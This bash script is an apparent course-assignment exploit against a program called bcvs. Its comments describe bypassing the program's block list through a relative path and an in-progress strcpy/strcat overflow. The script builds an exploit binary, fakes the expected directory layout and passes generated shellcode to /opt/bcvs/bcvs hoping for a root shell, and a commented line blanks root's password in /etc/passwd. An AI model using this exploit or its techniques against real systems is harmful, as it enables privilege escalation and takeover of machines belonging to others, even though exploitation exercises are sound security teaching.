#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
#
# Right now I am working on exploiting the strcpy/strcat
# overflow in the copyFile function.
## ----------------------------------------------------- ##

EXPLOIT_EXE="../exploit"
SPLOIT_DIR="sploit8_dir"

# Setup necessary environment
gcc -o exploit exploit.c

rm -rf $SPLIOT_DIR
mkdir -p $SPLOIT_DIR
cd $SPLOIT_DIR
mkdir -p .bcvs
touch .bcvs/block.list

## Saving some stuff for later
# Following will give the root user no password
# cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'

OFFSET=0

cat <<EOS > "run_w_gdb.sh"
#!/bin/bash
SC=\$($EXPLOIT_EXE $OFFSET)
echo "Shellcode:"
echo -n "\$SC" | hexdump -C
gdb --args /opt/bcvs/bcvs ci "\$SC"
EOS

cat <<EOS > "echo_shellcode.sh"
#!/bin/bash
SC=\$($EXPLOIT_EXE $OFFSET)
echo "Shellcode:"
echo -n "\$SC" | hexdump -C
EOS

cat <<EOS > "update_sploit.sh"
cd ..
./sploit8.sh -s
cd $SPLOIT_DIR
EOS

chmod +x run_w_gdb.sh
chmod +x update_sploit.sh

if [[ $# -gt 0 && $1 == "-s" ]]; then
  echo "Skipping sploit. Scripts updated"
  exit 0
fi


SHELL_CODE=$($EXPLOIT_EXE)
#echo "$SHELL_CODE"

echo "Trying offset: $OFFSET"
SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
if [[ $? -ne 0 ]]; then
  echo "Failed to generate shellcode"
  exit -1
fi
echo "Shellcode (hex): "
echo -n "$SHELL_CODE" | hexdump -C
/opt/bcvs/bcvs ci "${SHELL_CODE}"

#/usr/bin/gdb /opt/bcvs/bcvs
# And then hopefully you have a root shell at this point
